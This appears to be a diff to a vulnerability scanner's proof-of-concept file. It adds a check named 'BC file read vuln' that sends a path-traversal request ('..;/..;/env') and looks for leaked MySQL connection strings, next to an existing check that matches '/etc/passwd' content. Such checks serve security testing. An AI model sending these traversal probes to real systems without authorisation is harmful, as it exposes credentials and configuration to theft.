@@ -278,3 +278,9 @@ pocs:
         - 'root:x'
       matchers-condition: or
       name: "Nginx/OpenResty file read vuln"
+    - metch: "get"
+      path: '/msg/jpush/getUserTagNames/..;/..;/env'
+      body:
+        - 'jdbc:mysql://'
+      matchers-condition: or
+      name: "BC file read vuln"
